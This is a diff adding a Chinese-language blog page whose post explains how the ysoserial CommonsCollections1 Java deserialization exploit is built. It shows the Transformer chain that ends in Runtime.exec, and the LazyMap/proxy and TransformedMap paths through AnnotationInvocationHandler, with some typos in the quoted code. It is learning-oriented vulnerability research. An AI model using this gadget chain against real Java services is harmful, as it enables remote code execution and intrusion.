@@ -1,0 +1,907 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="前一段时间一直在思考如何发掘java反序列化漏洞，最近有一点小的成果，因此借着学习著名的java反序列化利用工具ysoserial来整理下自己的思路。">
+<meta name="keywords" content="Java反序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化学习-CommonsCollections1">
+<meta property="og:url" content="http://yoursite.com/2019/09/29/Java反序列化学习-CommonsCollections1/index.html">
+<meta property="og:site_name" content="红猪的笔记">
+<meta property="og:description" content="前一段时间一直在思考如何发掘java反序列化漏洞，最近有一点小的成果，因此借着学习著名的java反序列化利用工具ysoserial来整理下自己的思路。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-09-28T16:23:03.230Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Java反序列化学习-CommonsCollections1">
+<meta name="twitter:description" content="前一段时间一直在思考如何发掘java反序列化漏洞，最近有一点小的成果，因此借着学习著名的java反序列化利用工具ysoserial来整理下自己的思路。">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/09/29/Java反序列化学习-CommonsCollections1/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Java反序列化学习-CommonsCollections1 | 红猪的笔记</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">红猪的笔记</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">I am always on the way</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />关于</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />分类</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />归档</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/29/Java反序列化学习-CommonsCollections1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="红猪">
+      <meta itemprop="description" content="我活在世上，无非想要明白些道理，遇见些有趣的事。倘能如我所愿，我的一生就算成功。">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="红猪的笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Java反序列化学习-CommonsCollections1
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-09-29 00:05:40 / 修改时间：00:23:03" itemprop="dateCreated datePublished" datetime="2019-09-29T00:05:40+08:00">2019-09-29</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/漏洞学习/" itemprop="url" rel="index"><span itemprop="name">漏洞学习</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>前一段时间一直在思考如何发掘java反序列化漏洞，最近有一点小的成果，因此借着学习著名的java反序列化利用工具ysoserial来整理下自己的思路。</p>
+<a id="more"></a>
+<h3 id="Java反序列化利用"><a href="#Java反序列化利用" class="headerlink" title="Java反序列化利用"></a>Java反序列化利用</h3><p>要想掌握Java反序列化漏洞payload的构造，那就要知道在构造Java反序列化的payload的构造过程中有三个比较特别重要的步骤，在这里简称为两点一链：</p>
+<h4 id="输入数据执行点"><a href="#输入数据执行点" class="headerlink" title="输入数据执行点"></a>输入数据执行点</h4><p>输入数据执行点是指能够将攻击者控制的数据作为java代码执行的位置。</p>
+<h4 id="反序列化传导链"><a href="#反序列化传导链" class="headerlink" title="反序列化传导链"></a>反序列化传导链</h4><p>反序列化传导链主要用作链接反序列化利用点和用户数据可控点，能够使用户可控的数据在反序列化过程中被利用。</p>
+<h4 id="反序列化利用点"><a href="#反序列化利用点" class="headerlink" title="反序列化利用点"></a>反序列化利用点</h4><p>反序列化是指在程序的执行流程中有执行反序列化的操作。该位置一般为程序自身实现，只需定位即可。</p>
+<h3 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h3><p>下面就对ysoserial中的各个payload的构造来讲解上面所说的两点一链。首先看一下CommonCollections1这个payload。</p>
+<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>Java Collections Framework 是JDK 1.2中的一个重要组成部分。它增加了许多强大的数据结构，加速了最重要的Java应用程序的开发。从那时起，它已经成为Java中集合处理的公认标准。官网介绍如下:Commons Collections使用场景很广，很多商业,开源项目都使用到了commons-collections.jar。 很多组件，容器，cms(诸如WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等)的rce漏洞都和Commons Collections反序列被披露事件有关。</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>JDK &lt;= 1.8u66<br>CommonCollections &lt; 3.1<br>CommonCollections =4.0 (commons-collections-4.0删除了lazyMap的decode方法，所以需要将代码中的<code>Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</code>修改为<code>Map lazyMap = LazyMap.lazyMap(innerMap,transformerChain);</code>)</p>
+<h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p><em>并未完全按照ysoserial中的代码进行分析，而是结合前面的思考结果进行分析。</em></p>
+<h5 id="输入数据执行点-1"><a href="#输入数据执行点-1" class="headerlink" title="输入数据执行点"></a>输入数据执行点</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">final String[] execArgs = new String[] &#123; command &#125;;</span><br><span class="line">// 构造输入数据执行点,实际执行的为Runtime.getRuntime().exec(command)语句</span><br><span class="line">final Transformer transformerChain = new ChainedTransformer(</span><br><span class="line">	new Transformer[]&#123; new ConstantTransformer(1) &#125;);</span><br><span class="line">	// real chain for after setup</span><br><span class="line">	final Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">	new ConstantTransformer(Runtime.class), </span><br><span class="line">    //传入的为Runtime的class类,调用clazz.getMethod(&quot;getRuntime&quot;,null)方法,返回method方法</span><br><span class="line">	new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;</span><br><span class="line">			String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">					&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">    // 传入的为Method实利，调用method.invoke(null,null)方法,返回Runtime类</span><br><span class="line">	new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;</span><br><span class="line">					Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">					null, new Object[0] &#125;),</span><br><span class="line">    // 传入的为Runtime类，调用Runtime.exec(command)方法，执行命令</span><br><span class="line">	new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">					new Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">	new ConstantTransformer(1) &#125;;</span><br><span class="line"></span><br><span class="line">        ………………        </span><br><span class="line">	Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers); // arm with actual transformer chain</span><br></pre></td></tr></table></figure>
+<p>根据上面的代码可以看到输入数据执行点就是利用Java中内置的类，能够将用户输入的数据作为代码执行。其中省略好表示的是反序列化传导链中的代码。</p>
+<h5 id="反序列化传导链-1"><a href="#反序列化传导链-1" class="headerlink" title="反序列化传导链"></a>反序列化传导链</h5><p>在CommonsCollections1中反序列化的传导链有两种构造方式，一种是使用<code>LazyMap</code>一种是使用<code>TransformedMap</code>,下面分别介绍这两种构造反序列化传导链的方法。</p>
+<ol>
+<li><code>LazyMap</code></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Map innerMap = new HashMap();</span><br><span class="line">LazyMap lazyMap = LazyMap.decorate(innerMap,transformerChain);</span><br><span class="line">String ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;;</span><br><span class="line">// 获取 ANN_INV_HANDLER_CLASS类的构造函数</span><br><span class="line">final Constructor&lt;?&gt; ctor = Class.forName(ANN_INV_HANDLER_CLASS).getDeclaredConstructors()[0];</span><br><span class="line">// 设置构造函数可访问</span><br><span class="line">Permit.setAccessible(ctor);</span><br><span class="line">// 创建InvocationHandler实例</span><br><span class="line">InvocationHandler invocationHandler = ctor.newInstance(Override.class, lazyMap);</span><br><span class="line">// 为Map创建代理类，Map接口所有的方法的调用都会调用invocationHandler实例的invoke方法</span><br><span class="line">Map proxyMap = Proxy.newProxInstance(Gadgets.class.getClassLoader(), </span><br><span class="line">    new Class[]&#123;Map.class&#125;, invocationHandler));</span><br><span class="line">// 利用创建的proxyMap来创建AnnotationInvocationHandler实例</span><br><span class="line">InvocationHandler serialHandler = ctor.newInstance(Override.class,proxyMap);</span><br></pre></td></tr></table></figure>
+<p>从上面的代码可以看出该利用链条有LazyMap，Proxy代理类和最后的AnnotationInvocationHandler实例。下面结合各个类的源代码，对该链条做一个详细的分析：<br>LazyMap.java<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public static Map decorate(Map map, Transformer factory) &#123;</span><br><span class="line">        return new LazyMap(map, factory);</span><br><span class="line">&#125;</span><br><span class="line">public Object get(Object key) &#123;</span><br><span class="line">    // create value for key if key is not currently in the map</span><br><span class="line">    if (map.containsKey(key) == false) &#123;</span><br><span class="line">        Object value = factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        return value;</span><br><span class="line">    &#125;</span><br><span class="line">    return map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>从上面可以看出，LazyMap的构造函数中可以传入一个Transformer作为参数，而且当从LazyMap实例中获取数据时，如果map中不含有该key，那么就会调用传入的transformer的transform方法。该步骤实现了LazyMap与前面Transformer的链接。<br>AnnotationInvocationHandler.java<br>该类的访问控制权限为包内访问，因此需要采用反射的方式进行访问。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"> AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line">        if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) &#123;</span><br><span class="line">            this.type = var1;</span><br><span class="line">            this.memberValues = var2;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">public Object invoke(Object var1, Method var2, Object[] var3) &#123;</span><br><span class="line">        String var4 = var2.getName();</span><br><span class="line">        Class[] var5 = var2.getParameterTypes();</span><br><span class="line">        if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length == 1 &amp;&amp; var5[0] == Object.class) &#123;</span><br><span class="line">            return this.equalsImpl(var3[0]);</span><br><span class="line">        &#125; else if (var5.length != 0) &#123;</span><br><span class="line">            throw new AssertionError(&quot;Too many parameters for an annotation method&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            assert va5.length == 0；</span><br><span class="line">            if（var4.equals(&quot;toString&quot;)）&#123;</span><br><span class="line">                return this.toStringImpl();</span><br><span class="line">            &#125; else if(var4.equals(&quot;hashCode&quot;))&#123;</span><br><span class="line">                return this.hashCodeImpl();</span><br><span class="line">            &#125;else if(var4.equals(&quot;annonationType&quot;))&#123;</span><br><span class="line">                return this.type;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                Object var6 = this.memeberValue.get(var4);</span><br><span class="line">           </span><br><span class="line">            …………………… // 由于jdk版本不对，需补充源代码</span><br><span class="line">&#125;</span><br><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">    throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    // Check to make sure that types have not evolved incompatibly</span><br><span class="line">    AnnotationType annotationType = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);//判断第一个参数是否为AnnotationType，因此使用Retention.class传入较好。  </span><br><span class="line">    &#125; catch(IllegalArgumentException e) &#123;</span><br><span class="line">        // Class is no longer an annotation type; all bets are off</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">    // memberValues.entrySet 方法触发了反序列化</span><br><span class="line">    for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        if (memberType != null) &#123;  </span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            if (!(memberType.isInstance(value) ||    </span><br><span class="line">                  value instanceof ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(               </span><br><span class="line">                    new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里只列出了AnnotationInvocationHandler类中使用到的代码，可以看到AnnotationInvocationHandler类的构造函数使用一个注解类和一个Map类构造实例。并且该类具有readObject方法，即能够进行序列化。但是此时有一个问题就是AnnotationInvocationHandler类在反序列化的过程中并没有直接调用其成员变量memberValues的get方法，查看其invoke方法中调用了memberValues的get方法。<br>因此，想到一个实现思路为利用AnnotationInvocationHandler实例和Map接口构造出一个代理类，当调用Map中的方法时，便会调用AnnotationInvocationHandler实例的invoke方法，进而调用LazyMap的get方法，最后实现对Transformer的调用，造成代码执行。<br>这就是为什么在构造传导链时需要两次创建AnnotationInvocationHandler的实例。<br>调用链条：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject</span><br><span class="line">    AnnotationInvocationHandler.invoke</span><br><span class="line">        LazyMap.get</span><br><span class="line">            Transformer.transform</span><br></pre></td></tr></table></figure></p>
+<ol start="2">
+<li><code>TransformedMap</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Map innerMap = new HashMap();</span><br><span class="line">innerMap.put(&quot;value&quot;,&quot;key&quot;);</span><br><span class="line">TransformerMap transformerMap = TransformerMap.decorate(innerMap,transformerChain);</span><br><span class="line"></span><br><span class="line">String ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;;</span><br><span class="line">// 获取 ANN_INV_HANDLER_CLASS类的构造函数</span><br><span class="line">final Constructor&lt;?&gt; ctor = Class.forName(ANN_INV_HANDLER_CLASS).getDeclaredConstructors()[0];</span><br><span class="line">// 设置构造函数可访问</span><br><span class="line">Permit.setAccessible(ctor);</span><br><span class="line">// 创建InvocationHandler实例</span><br><span class="line">InvocationHandler invocationHandler = ctor.newInstance(Retention.class,transformerMap);</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>从上面的代码中可以看出利用TransformedMap，只需生成一个TransformedMap实例，然后直接构造AnnotationInvocationHandler实例即可。但是需要注意的是，inner.map中输入值的key必需与构造AnnotationInvocationHandler实例时传入的注解类相对应，如Retention.class，则其值为字符串“value”。下面来分析下该传导链条的传导过程。<br>TransformedMap.java<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;</span><br><span class="line">        return new TransformedMap(map, keyTransformer, valueTransformer); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>AbstractInputCheckedMapDecorator.java (TransformedMap的父类)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public Object setValue(Object value) &#123;</span><br><span class="line">        value = parent.checkSetValue(value);</span><br><span class="line">        return entry.setValue(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">protected Object checkSetValue(Object value) &#123;</span><br><span class="line">    return this.valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>从上面可以看出，只要调用TransformedMap的setValue方法，便会调用Transformed链条，从而造成代码执行。分析AnnotationInvocationHandler类。<br>AnnotationInvocationHandler.java<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line">        if (var1.isAnnotation() &amp;&amp; var3.length == 1 &amp;&amp; var3[0] == Annotation.class) &#123;</span><br><span class="line">            this.type = var1;</span><br><span class="line">            this.memberValues = var2;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">    throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    // Check to make sure that types have not evolved incompatibly</span><br><span class="line">    AnnotationType annotationType = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);//判断第一个参数是否为AnnotationType，因此使用Retention.class传入较好。  </span><br><span class="line">    &#125; catch(IllegalArgumentException e) &#123;</span><br><span class="line">        // Class is no longer an annotation type; all bets are off</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"> </span><br><span class="line">    for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        if (memberType != null) &#123;  // i.e. member still exists</span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            if (!(memberType.isInstance(value) ||    // 获取的值不是annotationType类型，便会触发setValue。这里只需用简单的String即可触发。</span><br><span class="line">                  value instanceof ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(               // 此处触发一些列的Transformer</span><br><span class="line">                    new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>前面已经说过其构造函数会接收一个注解类和一个Map实例作为参数。主要是分析其readObject方法，在readObject方法中调用了memberValue.setValue方法。即只要能够经过判断，到达该方法则就会触发反序列化链条，从而造成代码执行。<br>分析readObject中的代码，主要是循环TransformedMap(即传入的innerMap)，然后获取其键值，之后查看注解类中是否有以该键值命名的类型，如果含有该类型，则比较其类型是否为value的实例化，如果不是则调用memberValue的setValue方法。<br>因此在选择注解类时，使用了Retention类，并为innerMap添加一个“value”为键的值（Retention类中有一个value方法）。<br>Retention.java<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@Target(ElementType.ANNOTATION_TYPE)</span><br><span class="line">public @interface Retention &#123;</span><br><span class="line">    /**</span><br><span class="line">     * Returns the retention policy.</span><br><span class="line">     * @return the retention policy</span><br><span class="line">     */</span><br><span class="line">    RetentionPolicy value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ol>
+<li><a href="https://www.freebuf.com/articles/web/214096.html" target="_blank" rel="noopener">玩转Ysoserial-CommonsCollection的七种利用方式分析</a></li>
+<li><a href="http://www.codersec.net/2018/02/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E7%8E%84%E9%93%81%E9%87%8D%E5%89%91%E4%B9%8BCommonsCollection(%E4%B8%8A" target="_blank" rel="noopener">java反序列化漏洞-玄铁重剑之CommonsCollection(上)</a>/)</li>
